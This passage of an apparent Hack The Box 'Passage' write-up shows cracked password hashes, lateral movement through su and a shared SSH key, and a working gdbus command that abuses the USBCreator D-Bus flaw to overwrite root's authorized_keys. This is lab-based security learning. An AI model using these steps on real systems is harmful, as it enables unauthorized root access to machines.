</span></span><span class="line"><span class="cl">b2cf7db7a51da35f8fa412f47f16cfea46090b75e399fde5ec6a0ec90250df52:debo
</span></span><span class="line"><span class="cl">5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
</span></span><span class="line"><span class="cl">e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1
</span></span><span class="line"><span class="cl">e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9:hacker
</span></span><span class="line"><span class="cl">59195c6c541c8307f1da2d1e768d6f2280c984df217ad5f4c64c3542b04111a4:mario
</span></span></code></pre></div><h4 id="su---paul">SU - paul</h4>
<p>I tried to spray the passwords on SSH, but it wanted an SSH key. I tried again with <code>su</code>, and password <code>atlanta1</code> worked on <code>paul</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@passage:/home$ su paul 
</span></span><span class="line"><span class="cl">su paul
</span></span><span class="line"><span class="cl">Password: atlanta1
</span></span><span class="line"><span class="cl">paul@passage:~$ 
</span></span></code></pre></div><h3 id="shell-as-nadav">Shell as nadav</h3>
<h4 id="shared-ssh-keys">Shared SSH keys</h4>
<p>Escalating from <code>paul</code> to <code>nadav</code> is pretty straight forward, I found out that user <code>nadav</code> uses the same SSH keys as user <code>paul</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">paul@passage:~/.ssh$ cat id_rsa.pub <span class="o">&amp;&amp;</span> cat authorized_keys
</span></span><span class="line"><span class="cl">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</span></span><span class="line"><span class="cl">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage
</span></span></code></pre></div><p>So I can just SSH from <code>paul</code> to <code>nadav</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">paul@passage:~/.ssh$ ssh nadav@passage.htb
</span></span><span class="line"><span class="cl">Last login: Sun Sep  <span class="m">6</span> 11:12:03 <span class="m">2020</span> from 127.0.0.1
</span></span><span class="line"><span class="cl">nadav@passage:~$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>nadav<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,113<span class="o">(</span>lpadmin<span class="o">)</span>,128<span class="o">(</span>sambashare<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="internal-enumeration-1">Internal enumeration</h4>
<p>Since <code>nadav</code> is a member of the <code>sudo</code> group, I can just type <code>sudo su</code> to escalate to root, but unfortunately it requires <code>nadav</code>&rsquo;s password.</p>
<p>So I looking around <code>nadav</code>&rsquo;s home directory, and there is a <code>.viminfo</code> file (not sure if it&rsquo;s from the box or other players).</p>
<p><div class="img-container"><img src="imgs/c0375013a91f483582b37eebffa521d4.png" alt="c0375013a91f483582b37eebffa521d4"  /></div>
</p>
<p>The file contains the following information.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"># Command Line History (newest to oldest):
</span></span><span class="line"><span class="cl">:wq
</span></span><span class="line"><span class="cl">:%s/AdminIdentities=unix-group:root/AdminIdentities=unix-group:sudo/g
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"># File marks:
</span></span><span class="line"><span class="cl">&#39;0  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl">&#39;1  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># Jumplist (newest first):
</span></span><span class="line"><span class="cl">-&#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl">-&#39;  1  0  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl">-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">-&#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">-&#39;  1  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># History of marks within files (newest to oldest):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl">        &#34;       12      7
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl">        &#34;       2       0
</span></span><span class="line"><span class="cl">        .       2       0
</span></span><span class="line"><span class="cl">        +       2       0
</span></span></code></pre></div><p>The history of files points to these two configuration files:</p>
<ul>
<li><code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code></li>
<li><code>/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf</code></li>
</ul>
<p>The <code>51-ubuntu-admin.conf</code> defines there are only two groups that can be used for authentication when administrator authentication is needed, <code>sudo</code> and <code>admin</code>. This file is used by <a href="https://www.freedesktop.org/software/polkit/docs/0.105/pklocalauthority.8.html">Polkit</a>, which allows unprivileged process to communicate with the privileged ones. In the GUI, the prompt that asks you to enter a password when performing an administrative tasks are using Polkit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nadav@passage:~$ cat /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
</span></span><span class="line"><span class="cl"><span class="o">[</span>Configuration<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="nv">AdminIdentities</span><span class="o">=</span>unix-group:sudo<span class="p">;</span>unix-group:admin
</span></span></code></pre></div><p>I don&rsquo;t really understand in depth about <code>com.ubuntu.USBCreator.conf</code>. What I know is, this configuration file is used by a service called “com.ubuntu.USBCreator” that is owned by root. The ones that can invoke the methods on this service are constrained by PolicyKit/Polkit, and they are anyone in the <code>sudo</code> or the <code>admin</code> group (defined by the <code>51-ubuntu-admin.conf</code> file)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">nadav@passage:~$ cat /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf
</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE busconfig PUBLIC
</span></span></span><span class="line"><span class="cl"><span class="cp"> &#34;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&#34;
</span></span></span><span class="line"><span class="cl"><span class="cp"> &#34;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&#34;&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;busconfig&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- Only root can own the service --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;policy</span> <span class="na">user=</span><span class="s">&#34;root&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;allow</span> <span class="na">own=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/policy&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c">&lt;!-- Allow anyone to invoke methods (further constrained by
</span></span></span><span class="line"><span class="cl"><span class="c">       PolicyKit privileges --&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;policy</span> <span class="na">context=</span><span class="s">&#34;default&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class="line"><span class="cl">           <span class="na">send_interface=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class="line"><span class="cl">           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Introspectable&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;allow</span> <span class="na">send_destination=</span><span class="s">&#34;com.ubuntu.USBCreator&#34;</span>
</span></span><span class="line"><span class="cl">           <span class="na">send_interface=</span><span class="s">&#34;org.freedesktop.DBus.Properties&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;/policy&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/busconfig&gt;</span>
</span></span></code></pre></div><p>From here, it looks only <code>nadav</code> that can invoke the methods of this service</p>
<h4 id="usbcreator-d-bus-interface-vulnerability">USBCreator D-Bus Interface Vulnerability</h4>
<p>There is a research about a vulnerability in USBCreator D-Bus Interface, which can be used for local privilege escalation<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. The research summary as follows:</p>
<p>&ldquo;<em>A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root - without supplying a password. This trivially leads to elevated privileges, for instance, by overwriting the shadow file and setting a password for root. The issue was resolved in June when Ubuntu <a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1832337">patched</a> the relevant packages in response to a vulnerability disclosure from Unit 42.</em>&rdquo;</p>
<p>The bug was first reported in 2016<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>, and the affected Ubuntu version is 16.04.</p>
<p><div class="img-container"><img src="imgs/image-20210508150754640.png" alt="image-20210508150754640"  /></div>
</p>
<p>The current machine is not an exact match, but since the vulnerability is patched in 2019, it may affect this version too.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nadav@passage:~$ uname -a
</span></span><span class="line"><span class="cl">Linux passage 4.15.0-45-generic <span class="c1">#48~16.04.1-Ubuntu SMP Sun Sep 6 14:31:10 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
</span></span></code></pre></div><h4 id="overwrite-authorized_keys">Overwrite authorized_keys</h4>
<p>One of the tools used by the researcher to exploit the vulnerability is a CLI-based called <code>gdbus</code>.</p>
<p>With user <code>nadav</code>, I can try to overwrite the authorized_keys file contents in the root directory with my public key.</p>
<p>I&rsquo;ll put my public key named <code>key</code> in <code>/dev/shm/</code>, and then I&rsquo;ll  invoke the following command:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /dev/shm/key /root/.ssh/authorized_keys <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">()</span>
</span></span></code></pre></div><p>I tried to login as root using my private key, and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «passage» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ ssh -i root_rsa root@10.10.10.206
</span></span><span class="line"><span class="cl">Last login: Fri Mar  <span class="m">5</span> 17:33:39 <span class="m">2020</span> from 10.10.14.7
</span></span><span class="line"><span class="cl">root@passage:~# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">12</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Jul <span class="m">21</span>  <span class="m">2020</span> exploits
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> root root   <span class="m">33</span> Mar  <span class="m">5</span> 17:05 root.txt
</span></span><span class="line"><span class="cl">root@passage:~# 
</span></span></code></pre></div><div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p><a href="https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149">https://bugs.launchpad.net/ubuntu/+source/policykit-desktop-privileges/+bug/1568149</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
